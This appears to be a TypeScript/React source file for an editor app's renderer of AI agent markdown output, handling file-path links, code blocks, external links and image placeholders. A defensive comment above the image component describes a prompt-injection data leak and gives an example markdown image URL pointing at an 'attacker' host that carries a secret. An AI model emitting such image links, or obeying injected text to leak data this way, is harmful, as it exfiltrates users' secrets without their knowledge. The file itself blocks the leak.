import { Children, isValidElement, memo, useMemo, useState, type ReactNode } from 'react'
import ReactMarkdown, { defaultUrlTransform, type Components, type Options as MarkdownOptions } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import rehypeHighlight from 'rehype-highlight'
import { Check, ChevronDown, Copy, CornerDownLeft } from 'lucide-react'
import { atom } from '../../../lib/api'
import { cn } from '../../../lib/cn'
import { getActiveMonacoEditor, useEditorStore } from '../../../stores/editor'
import { toast } from '../../../stores/toast'
import { FileIcon } from '../../../lib/file-icons'
import { useCopy, useTranscript } from './context'
import { findPathsInText, isLinkableCodePath, looksLikeFilePath, openFileRef, parseFileRef, displayPath, lineRangeLabel } from './file-links'
import { countLines } from './format'

const FILE_PROTOCOL = 'atom-file:'

// ─────────────────────────────────────────────────────────────────────────────
// remark plugin: plain-text file paths → links with the atom-file: protocol
// ─────────────────────────────────────────────────────────────────────────────

/** Minimal mdast shape (we only touch text and link nodes). */
interface MdNode {
  type: string
  value?: string
  url?: string
  title?: string | null
  children?: MdNode[]
}

const SKIP_NODES = new Set(['link', 'linkReference', 'inlineCode', 'code', 'html', 'definition', 'image', 'imageReference'])

function linkifyFilePaths(workspace: string) {
  const splitText = (value: string): MdNode[] | null => {
    const matches = findPathsInText(value, workspace)
    if (!matches.length) return null
    const out: MdNode[] = []
    let pos = 0
    for (const m of matches) {
      if (m.start > pos) out.push({ type: 'text', value: value.slice(pos, m.start) })
      out.push({ type: 'link', url: FILE_PROTOCOL + encodeURIComponent(m.text), title: null, children: [{ type: 'text', value: m.text }] })
      pos = m.end
    }
    if (pos < value.length) out.push({ type: 'text', value: value.slice(pos) })
    return out
  }
  const walk = (node: MdNode): void => {
    if (!node.children) return
    let changed = false
    const next: MdNode[] = []
    for (const child of node.children) {
      if (child.type === 'text' && child.value) {
        const parts = splitText(child.value)
        if (parts) {
          next.push(...parts)
          changed = true
          continue
        }
      } else if (!SKIP_NODES.has(child.type)) {
        walk(child)
      }
      next.push(child)
    }
    if (changed) node.children = next
  }
  return () => (tree: MdNode) => walk(tree)
}

function urlTransform(url: string): string | null | undefined {
  return url.startsWith(FILE_PROTOCOL) ? url : defaultUrlTransform(url)
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

/** Plain text of rendered React children (used for code copy / insert). */
export function nodeText(node: ReactNode): string {
  if (node === null || node === undefined || typeof node === 'boolean') return ''
  if (typeof node === 'string' || typeof node === 'number') return String(node)
  if (Array.isArray(node)) return node.map(nodeText).join('')
  if (isValidElement<{ children?: ReactNode }>(node)) return nodeText(node.props.children)
  return ''
}

/**
 * Split markdown into top-level chunks at blank lines outside code fences, so that while streaming only the
 * last chunk re-renders. A chunk boundary is only placed before a non-indented line.
 */
export function splitMarkdownChunks(src: string): string[] {
  if (src.length < 600) return [src]
  const lines = src.split('\n')
  const chunks: string[] = []
  let buf: string[] = []
  let fence: string | null = null
  let blank = false
  for (const line of lines) {
    const fm = /^\s{0,3}(`{3,}|~{3,})/.exec(line)
    if (fence) {
      buf.push(line)
      if (fm && fm[1][0] === fence[0] && fm[1].length >= fence.length && line.trim() === fm[1]) fence = null
      continue
    }
    if (!line.trim()) {
      blank = true
      buf.push(line)
      continue
    }
    if (blank && buf.length && !/^\s/.test(line) && !/^\|/.test(line)) {
      chunks.push(buf.join('\n'))
      buf = []
    }
    blank = false
    if (fm) fence = fm[1]
    buf.push(line)
  }
  if (buf.length) chunks.push(buf.join('\n'))
  return chunks
}

// ─────────────────────────────────────────────────────────────────────────────
// Links & inline code
// ─────────────────────────────────────────────────────────────────────────────

function FileLink({ raw, children, mono }: { raw: string; children: ReactNode; mono?: boolean }) {
  const { workspace } = useTranscript()
  const ref = parseFileRef(raw)
  const label = displayPath(ref.path, workspace)
  const range = lineRangeLabel(ref.line, ref.endLine)
  return (
    <a
      role="link"
      tabIndex={0}
      title={`Open ${label}${range ? ` at ${range}` : ''}`}
      onClick={(e) => {
        e.preventDefault()
        openFileRef(ref, workspace)
      }}
      onKeyDown={(e) => {
        if (e.key === 'Enter') openFileRef(ref, workspace)
      }}
      className={cn('cursor-pointer no-underline hover:underline', mono && 'font-mono text-[0.92em]')}
    >
      {children}
    </a>
  )
}

function MdLink({ href, children }: { href?: string; children?: ReactNode }) {
  const { workspace } = useTranscript()
  if (!href) return <span>{children}</span>
  if (href.startsWith(FILE_PROTOCOL)) {
    // Model output can contain a literal `atom-file:` link with a bad escape (`%FF`): never throw during render.
    let raw = href.slice(FILE_PROTOCOL.length)
    try {
      raw = decodeURIComponent(raw)
    } catch {
      /* keep the raw text; parseFileRef tolerates it */
    }
    return <FileLink raw={raw}>{children}</FileLink>
  }
  if (/^(https?:|mailto:)/i.test(href)) {
    return (
      <a
        href={href}
        title={href}
        onClick={(e) => {
          e.preventDefault()
          void atom.app.openExternal(href)
        }}
      >
        {children}
      </a>
    )
  }
  if (href.startsWith('#')) return <span className="text-accent">{children}</span>
  // Relative markdown links ([app.ts](src/app.ts#L10)) open in the editor.
  const ref = parseFileRef(href)
  if (looksLikeFilePath(ref.path)) {
    return (
      <a
        title={`Open ${displayPath(ref.path, workspace)}`}
        onClick={(e) => {
          e.preventDefault()
          openFileRef(ref, workspace)
        }}
      >
        {children}
      </a>
    )
  }
  return <span className="text-accent">{children}</span>
}

/**
 * Images: only inline `data:image/` sources render. Remote images are never fetched automatically — agent output
 * can be steered by prompt injection, and an auto-loading `![](https://attacker/?d=<secret>)` would leak data
 * with zero clicks. They show as a placeholder that opens in the system browser on an explicit click.
 */
function MdImage({ src, alt }: { src?: string; alt?: string }) {
  const label = alt ? `[image: ${alt}]` : '[image]'
  if (src && /^data:image\//i.test(src)) {
    return <img src={src} alt={alt ?? ''} className="my-2 max-h-[320px] max-w-full rounded-md border border-line" />
  }
  if (src && /^https?:/i.test(src)) {
    const open = (e: { currentTarget: HTMLElement; preventDefault(): void; stopPropagation(): void }): void => {
      // An image inside a link ([![badge](…)](url)): the link handles the click.
      if (e.currentTarget.parentElement?.closest('a')) return
      e.preventDefault()
      e.stopPropagation()
      void atom.app.openExternal(src)
    }
    return (
      <span
        role="link"
        tabIndex={0}
        title={`Remote image (not loaded) — open ${src} in the browser`}
        onClick={open}
        onKeyDown={(e) => {
          if (e.key === 'Enter') open(e)
        }}
        className="cursor-pointer text-accent hover:underline"
      >
        {label}
      </span>
    )
  }
  return <span className="text-muted">{label}</span>
}

function InlineCode({ children }: { children?: ReactNode }) {
  const { workspace } = useTranscript()
  const text = nodeText(children)
  const ref = text.length < 300 ? isLinkableCodePath(text, workspace) : null
  if (!ref) return <code>{children}</code>
  const label = displayPath(ref.path, workspace)
  return (
    <code
      role="link"
      tabIndex={0}
      title={`Open ${label}${ref.line ? ` at line ${ref.line}` : ''}`}
      onClick={() => openFileRef(ref, workspace)}
      onKeyDown={(e) => {
        if (e.key === 'Enter') openFileRef(ref, workspace)
      }}
      className="cursor-pointer !text-accent hover:underline"
    >
      {children}
    </code>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Code blocks
// ─────────────────────────────────────────────────────────────────────────────

const COLLAPSE_LINES = 40

const LANGUAGE_LABELS: Record<string, string> = {
  ts: 'TypeScript',
  typescript: 'TypeScript',
  tsx: 'TSX',
  js: 'JavaScript',
  javascript: 'JavaScript',
  jsx: 'JSX',
  py: 'Python',
  python: 'Python',
  sh: 'Shell',
  bash: 'Bash',
  shell: 'Shell',
  zsh: 'Shell',
  console: 'Console',
  json: 'JSON',
  yaml: 'YAML',
  yml: 'YAML',
  md: 'Markdown',
  markdown: 'Markdown',
  html: 'HTML',
  css: 'CSS',
  scss: 'SCSS',
  rs: 'Rust',
  rust: 'Rust',
  go: 'Go',
  java: 'Java',
  kotlin: 'Kotlin',
  swift: 'Swift',
  rb: 'Ruby',
  ruby: 'Ruby',
  php: 'PHP',
  c: 'C',
  cpp: 'C++',
  csharp: 'C#',
  cs: 'C#',
  sql: 'SQL',
  diff: 'Diff',
  toml: 'TOML',
  xml: 'XML',
  dockerfile: 'Dockerfile',
  graphql: 'GraphQL',
  text: 'Text',
  txt: 'Text',
  plaintext: 'Text'
}

function parseFenceInfo(className: string | undefined): { language: string; file: string | null } {
  const m = /(?:^|\s)language-(\S+)/.exec(className ?? '')
  if (!m) return { language: '', file: null }
  const info = m[1]
  const colon = info.indexOf(':')
  if (colon > 0) {
    const file = info.slice(colon + 1)
    return { language: info.slice(0, colon), file: looksLikeFilePath(parseFileRef(file).path) ? file : null }
  }
  return { language: info, file: null }
}

function useCanInsert(): boolean {
  return useEditorStore((s) => s.tabs.some((t) => t.id === s.activeTabId && t.kind === 'file'))
}

function insertAtCursor(code: string): void {
  const editor = getActiveMonacoEditor()
  if (!editor) {
    toast.info('Open a file in the editor to insert code')
    return
  }
  if (editor.getRawOptions().readOnly) {
    toast.info('The active editor is read-only')
    return
  }
  const selection = editor.getSelection()
  if (!selection) return
  editor.pushUndoStop()
  editor.executeEdits('atom-chat', [{ range: selection, text: code, forceMoveMarkers: true }])
  editor.pushUndoStop()
  editor.focus()
}

export function CodeBlock({ className, children }: { className?: string; children?: ReactNode }) {
  const { workspace } = useTranscript()
  const [copied, copy] = useCopy()
  const canInsert = useCanInsert()
  const [expanded, setExpanded] = useState(false)
  const { language, file } = parseFenceInfo(className)
  const code = nodeText(children).replace(/\n$/, '')
  const lines = countLines(code)
  const collapsible = lines > COLLAPSE_LINES
  const label = LANGUAGE_LABELS[language.toLowerCase()] ?? language
  const fileRef = file ? parseFileRef(file) : null

  return (
    <div className="group/code my-2 overflow-hidden rounded-lg border border-line bg-input">
      <div className="flex h-7 items-center gap-1 border-b border-line bg-elevated pl-2.5 pr-1 text-[11px] text-subtle">
        {fileRef ? (
          <button
            type="button"
            title={`Open ${displayPath(fileRef.path, workspace)}`}
            onClick={() => openFileRef(fileRef, workspace)}
            className="flex min-w-0 items-center gap-1.5 truncate text-muted hover:text-fg"
          >
            <FileIcon name={fileRef.path} size={12} />
            <span className="truncate font-mono">{displayPath(fileRef.path, workspace)}</span>
          </button>
        ) : (
          <span className="truncate font-medium">{label || 'Code'}</span>
        )}
        <span className="flex-1" />
        {canInsert && (
          <button
            type="button"
            title="Insert at cursor in the active editor"
            onClick={() => insertAtCursor(code)}
            className="flex h-5 items-center gap-1 rounded px-1.5 text-muted opacity-0 transition-opacity hover:bg-hover hover:text-fg focus:opacity-100 group-hover/code:opacity-100"
          >
            <CornerDownLeft size={11} />
            Insert
          </button>
        )}
        <button
          type="button"
          title={copied ? 'Copied' : 'Copy code'}
          onClick={() => copy(code)}
          className="flex h-5 items-center gap-1 rounded px-1.5 text-muted hover:bg-hover hover:text-fg"
        >
          {copied ? <Check size={11} className="text-success" /> : <Copy size={11} />}
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <div className={cn('relative', collapsible && !expanded && 'max-h-[420px] overflow-hidden')}>
        <pre className="selectable !my-0 overflow-x-auto px-3 py-2.5 font-mono text-[12px] leading-[1.6]">
          <code className={cn(className, 'hljs !bg-transparent')}>{children}</code>
        </pre>
        {collapsible && !expanded && (
          <div className="pointer-events-none absolute inset-x-0 bottom-0 h-16 bg-gradient-to-t from-input to-transparent" />
        )}
      </div>
      {collapsible && (
        <button
          type="button"
          onClick={() => setExpanded((v) => !v)}
          className="flex w-full items-center justify-center gap-1 border-t border-line bg-elevated py-1 text-[11px] text-muted hover:bg-hover hover:text-fg"
        >
          <ChevronDown size={12} className={cn('transition-transform', expanded && 'rotate-180')} />
          {expanded ? 'Collapse' : `Show all ${lines} lines`}
        </button>
      )}
    </div>
  )
}

function Pre({ children }: { children?: ReactNode }) {
  const child = Children.toArray(children)[0]
  if (isValidElement<{ className?: string; children?: ReactNode }>(child)) {
    return <CodeBlock className={child.props.className}>{child.props.children}</CodeBlock>
  }
  return <CodeBlock>{children}</CodeBlock>
}

const COMPONENTS: Components = {
  pre: ({ children }) => <Pre>{children}</Pre>,
  code: ({ children }) => <InlineCode>{children}</InlineCode>,
  a: ({ href, children }) => <MdLink href={href}>{children}</MdLink>,
  table: ({ children }) => (
    <div className="my-2 overflow-x-auto">
      <table className="!my-0">{children}</table>
    </div>
  ),
  img: ({ src, alt }) => <MdImage src={typeof src === 'string' ? src : undefined} alt={alt} />,
  input: ({ type, checked }) =>
    type === 'checkbox' ? (
      <input type="checkbox" checked={!!checked} readOnly className="mr-1.5 translate-y-[1px] accent-[var(--accent)]" />
    ) : null
}

const REHYPE_PLUGINS: MarkdownOptions['rehypePlugins'] = [[rehypeHighlight, { detect: false }]]

const MarkdownChunk = memo(function MarkdownChunk({ content, workspace }: { content: string; workspace: string }) {
  const remarkPlugins = useMemo<MarkdownOptions['remarkPlugins']>(() => [remarkGfm, linkifyFilePaths(workspace)], [workspace])
  return (
    <ReactMarkdown
      remarkPlugins={remarkPlugins}
      rehypePlugins={REHYPE_PLUGINS}
      components={COMPONENTS}
      urlTransform={urlTransform}
    >
      {content}
    </ReactMarkdown>
  )
})

/**
 * Shared markdown renderer for agent output: GFM, syntax highlighted code blocks with Copy / Insert at cursor,
 * clickable file paths (`src/app.ts:42`) and external links opened in the system browser.
 */
export function Markdown({ content, className }: { content: string; className?: string }) {
  const { workspace } = useTranscript()
  const chunks = useMemo(() => splitMarkdownChunks(content), [content])
  return (
    <div className={cn('markdown', className)}>
      {chunks.map((chunk, i) => (
        <MarkdownChunk key={i} content={chunk} workspace={workspace} />
      ))}
    </div>
  )
}
